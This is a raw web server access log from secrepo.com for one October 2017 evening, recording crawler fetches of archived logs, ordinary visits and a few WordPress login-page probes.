207.46.13.133 - - [10/Oct/2017:16:34:30 -0700] "GET /self.logs/access.log.2016-01-19.gz HTTP/1.1" 404 340 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
216.244.66.227 - - [10/Oct/2017:16:35:54 -0700] "GET /self.logs/2016/error.log.2016-08-27.gz HTTP/1.1" 200 548 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:16:35:59 -0700] "GET /self.logs/2016/error.log.2016-09-29.gz HTTP/1.1" 200 484 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:16:36:01 -0700] "GET /self.logs/2016/error.log.2016-12-14.gz HTTP/1.1" 200 871 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
207.46.13.181 - - [10/Oct/2017:16:38:28 -0700] "GET /self.logs/error.log.2017-09-30.gz HTTP/1.1" 200 2073 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
4.7.14.6 - - [10/Oct/2017:16:40:34 -0700] "GET / HTTP/1.1" 200 11061 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063" 
4.7.14.6 - - [10/Oct/2017:16:40:34 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063" 
4.7.14.6 - - [10/Oct/2017:16:40:34 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063" 
4.7.14.6 - - [10/Oct/2017:16:40:35 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063" 
216.244.66.198 - - [10/Oct/2017:16:44:53 -0700] "GET /self.logs/?C=N;O=D HTTP/1.1" 200 54301 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.250 - - [10/Oct/2017:16:46:41 -0700] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
92.190.137.59 - - [10/Oct/2017:16:48:26 -0700] "GET / HTTP/1.1" 200 11061 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38" 
92.190.137.59 - - [10/Oct/2017:16:48:26 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38" 
92.190.137.59 - - [10/Oct/2017:16:48:26 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38" 
92.190.137.59 - - [10/Oct/2017:16:48:27 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38" 
40.77.167.131 - - [10/Oct/2017:17:00:26 -0700] "GET /self.logs/error.log.2016-04-02.gz HTTP/1.1" 404 340 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
216.244.66.227 - - [10/Oct/2017:17:01:15 -0700] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
108.80.118.249 - - [10/Oct/2017:17:06:09 -0700] "GET / HTTP/1.1" 200 11061 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
108.80.118.249 - - [10/Oct/2017:17:06:09 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
108.80.118.249 - - [10/Oct/2017:17:06:09 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
108.80.118.249 - - [10/Oct/2017:17:06:10 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
108.80.118.249 - - [10/Oct/2017:17:06:47 -0700] "GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1" 200 45825560 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
216.244.66.227 - - [10/Oct/2017:17:09:46 -0700] "GET /self.logs/2015/access.log.2015-02-24.gz HTTP/1.1" 200 4551 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:17:09:47 -0700] "GET /self.logs/2015/access.log.2015-02-28.gz HTTP/1.1" 200 2878 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:17:09:48 -0700] "GET /self.logs/2015/access.log.2015-04-01.gz HTTP/1.1" 200 4750 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:17:09:50 -0700] "GET /self.logs/2015/access.log.2015-05-17.gz HTTP/1.1" 200 4002 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:17:09:51 -0700] "GET /self.logs/2015/error.log.2015-10-31.gz HTTP/1.1" 200 910 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:17:09:53 -0700] "GET /self.logs/2016/access.log.2016-04-02.gz HTTP/1.1" 200 19874 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:17:09:54 -0700] "GET /self.logs/2016/error.log.2016-02-01.gz HTTP/1.1" 200 711 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:17:09:55 -0700] "GET /self.logs/2016/error.log.2016-02-15.gz HTTP/1.1" 200 658 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:17:09:57 -0700] "GET /self.logs/2016/error.log.2016-07-09.gz HTTP/1.1" 200 962 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
140.96.164.235 - - [10/Oct/2017:17:12:41 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
118.131.32.227 - - [10/Oct/2017:17:14:02 -0700] "GET /wp-login.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
118.131.32.227 - - [10/Oct/2017:17:14:07 -0700] "GET /wp-login.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
42.236.99.51 - - [10/Oct/2017:17:14:09 -0700] "GET / HTTP/1.1" 301 483 "http://secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider" 
42.236.99.51 - - [10/Oct/2017:17:14:09 -0700] "GET / HTTP/1.1" 200 11061 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider" 
42.236.99.51 - - [10/Oct/2017:17:14:09 -0700] "GET / HTTP/1.1" 200 11060 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider" 
118.131.32.227 - - [10/Oct/2017:17:14:13 -0700] "GET / HTTP/1.1" 200 37415 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
59.49.34.3 - - [10/Oct/2017:17:14:41 -0700] "GET / HTTP/1.1" 200 11061 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0" 
202.207.191.2 - - [10/Oct/2017:17:14:44 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0" 
202.207.191.2 - - [10/Oct/2017:17:14:44 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0" 
207.46.13.133 - - [10/Oct/2017:17:16:18 -0700] "GET /self.logs/access.log.2017-01-18.gz HTTP/1.1" 200 15340 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
118.131.32.227 - - [10/Oct/2017:17:18:37 -0700] "GET /wp-login.php HTTP/1.1" 301 522 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
118.131.32.227 - - [10/Oct/2017:17:18:38 -0700] "GET /wp-login.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
101.226.33.217 - - [10/Oct/2017:17:18:40 -0700] "GET / HTTP/1.1" 200 11061 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36" 
118.131.32.227 - - [10/Oct/2017:17:18:44 -0700] "GET /wp-login.php HTTP/1.1" 301 522 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
118.131.32.227 - - [10/Oct/2017:17:18:45 -0700] "GET /wp-login.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
118.131.32.227 - - [10/Oct/2017:17:18:51 -0700] "GET / HTTP/1.1" 301 498 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
118.131.32.227 - - [10/Oct/2017:17:19:01 -0700] "GET / HTTP/1.1" 200 37415 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
113.140.25.178 - - [10/Oct/2017:17:24:01 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36" 
113.140.25.178 - - [10/Oct/2017:17:24:01 -0700] "GET / HTTP/1.1" 200 11061 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36" 
113.140.25.178 - - [10/Oct/2017:17:24:02 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36" 
113.140.25.178 - - [10/Oct/2017:17:24:02 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36" 
216.244.66.227 - - [10/Oct/2017:17:33:21 -0700] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:17:35:32 -0700] "GET /self.logs/2015/error.log.2015-02-10.gz HTTP/1.1" 200 4789 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:17:35:33 -0700] "GET /self.logs/2015/error.log.2015-04-03.gz HTTP/1.1" 200 829 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:17:35:34 -0700] "GET /self.logs/2015/error.log.2015-09-16.gz HTTP/1.1" 200 710 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:17:35:36 -0700] "GET /self.logs/2015/error.log.2015-09-30.gz HTTP/1.1" 200 642 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:17:35:37 -0700] "GET /self.logs/2015/error.log.2015-10-21.gz HTTP/1.1" 200 625 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:17:35:38 -0700] "GET /self.logs/2015/error.log.2015-12-11.gz HTTP/1.1" 200 611 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:17:35:39 -0700] "GET /self.logs/2016/access.log.2016-04-05.gz HTTP/1.1" 200 12617 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:17:35:40 -0700] "GET /self.logs/2016/access.log.2016-09-25.gz HTTP/1.1" 200 7014 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:17:35:41 -0700] "GET /self.logs/2016/access.log.2016-10-17.gz HTTP/1.1" 200 9058 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:17:35:42 -0700] "GET /self.logs/2016/access.log.2016-11-05.gz HTTP/1.1" 200 5843 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:17:35:44 -0700] "GET /self.logs/2016/access.log.2016-11-09.gz HTTP/1.1" 200 13020 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:17:35:46 -0700] "GET /self.logs/2016/error.log.2016-06-10.gz HTTP/1.1" 200 1010 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:17:35:48 -0700] "GET /self.logs/2016/error.log.2016-02-09.gz HTTP/1.1" 200 574 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
100.36.28.220 - - [10/Oct/2017:17:36:30 -0700] "GET / HTTP/1.1" 200 11061 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
100.36.28.220 - - [10/Oct/2017:17:36:30 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
100.36.28.220 - - [10/Oct/2017:17:36:30 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
100.36.28.220 - - [10/Oct/2017:17:36:30 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
108.80.118.249 - - [10/Oct/2017:17:40:35 -0700] "GET /self.logs/ HTTP/1.1" 200 5994 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
108.80.118.249 - - [10/Oct/2017:17:40:36 -0700] "GET /favicon.ico HTTP/1.1" 200 267 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
207.46.13.181 - - [10/Oct/2017:17:50:20 -0700] "GET /self.logs/access.log.2015-02-10.gz HTTP/1.1" 404 340 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
173.252.88.95 - - [10/Oct/2017:17:51:42 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" 
36.74.181.243 - - [10/Oct/2017:17:54:28 -0700] "GET /wp-login.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
36.74.181.243 - - [10/Oct/2017:17:54:34 -0700] "GET /wp-login.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
36.74.181.243 - - [10/Oct/2017:17:54:39 -0700] "GET / HTTP/1.1" 200 37415 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
216.244.66.227 - - [10/Oct/2017:17:55:05 -0700] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:17:57:11 -0700] "GET /self.logs/2015/access.log.2015-04-06.gz HTTP/1.1" 200 2639 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:17:57:12 -0700] "GET /self.logs/2015/error.log.2015-08-05.gz HTTP/1.1" 200 952 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:17:57:14 -0700] "GET /self.logs/2015/error.log.2015-11-02.gz HTTP/1.1" 200 905 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:17:57:15 -0700] "GET /self.logs/2016/access.log.2016-01-11.gz HTTP/1.1" 200 6461 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:17:57:17 -0700] "GET /self.logs/2016/access.log.2016-07-19.gz HTTP/1.1" 200 7739 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:17:57:18 -0700] "GET /self.logs/2016/error.log.2016-06-04.gz HTTP/1.1" 200 1228 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:17:57:20 -0700] "GET /self.logs/2016/error.log.2016-11-26.gz HTTP/1.1" 200 603 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
207.46.13.133 - - [10/Oct/2017:17:58:09 -0700] "GET /self.logs/error.log.2017-02-22.gz HTTP/1.1" 200 962 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
66.249.93.95 - - [10/Oct/2017:18:07:47 -0700] "GET / HTTP/1.1" 200 11061 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
66.249.93.64 - - [10/Oct/2017:18:07:48 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
157.55.39.166 - - [10/Oct/2017:18:16:23 -0700] "GET /self.logs/error.log.2017-09-06.gz HTTP/1.1" 200 3488 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
216.244.66.227 - - [10/Oct/2017:18:16:39 -0700] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
116.24.65.108 - - [10/Oct/2017:18:16:44 -0700] "GET / HTTP/1.1" 304 189 "https://www.google.com.hk/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38" 
73.219.21.21 - - [10/Oct/2017:18:17:35 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36" 
73.219.21.21 - - [10/Oct/2017:18:17:35 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36" 
116.24.65.108 - - [10/Oct/2017:18:18:05 -0700] "GET /self.logs/ HTTP/1.1" 200 5994 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38" 
116.24.65.108 - - [10/Oct/2017:18:18:05 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38" 
216.244.66.227 - - [10/Oct/2017:18:18:46 -0700] "GET /self.logs/2015/access.log.2015-01-24.gz HTTP/1.1" 200 2174 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:18:18:47 -0700] "GET /self.logs/2015/access.log.2015-03-23.gz HTTP/1.1" 200 4025 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:18:18:48 -0700] "GET /self.logs/2015/access.log.2015-05-21.gz HTTP/1.1" 200 4871 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:18:18:49 -0700] "GET /self.logs/2015/access.log.2015-09-04.gz HTTP/1.1" 200 7005 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:18:18:50 -0700] "GET /self.logs/2015/access.log.2015-11-17.gz HTTP/1.1" 200 5498 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:18:18:51 -0700] "GET /self.logs/2015/error.log.2015-04-13.gz HTTP/1.1" 200 742 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:18:18:52 -0700] "GET /self.logs/2015/error.log.2015-06-16.gz HTTP/1.1" 200 644 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:18:18:53 -0700] "GET /self.logs/2015/error.log.2015-06-18.gz HTTP/1.1" 200 604 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:18:18:54 -0700] "GET /self.logs/2015/error.log.2015-08-07.gz HTTP/1.1" 200 992 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:18:18:55 -0700] "GET /self.logs/2015/error.log.2015-08-23.gz HTTP/1.1" 200 772 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:18:18:56 -0700] "GET /self.logs/2015/error.log.2015-10-16.gz HTTP/1.1" 200 708 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:18:18:57 -0700] "GET /self.logs/2015/error.log.2015-12-16.gz HTTP/1.1" 200 579 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:18:18:58 -0700] "GET /self.logs/2016/access.log.2016-01-06.gz HTTP/1.1" 200 5381 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:18:18:59 -0700] "GET /self.logs/2016/access.log.2016-02-12.gz HTTP/1.1" 200 9146 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:18:19:00 -0700] "GET /self.logs/2016/access.log.2016-05-27.gz HTTP/1.1" 200 10576 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:18:19:01 -0700] "GET /self.logs/2016/access.log.2016-09-22.gz HTTP/1.1" 200 7960 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:18:19:02 -0700] "GET /self.logs/2016/error.log.2016-02-21.gz HTTP/1.1" 200 681 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:18:19:02 -0700] "GET /self.logs/2016/error.log.2016-06-05.gz HTTP/1.1" 200 905 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:18:19:03 -0700] "GET /self.logs/2016/error.log.2016-10-17.gz HTTP/1.1" 200 623 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
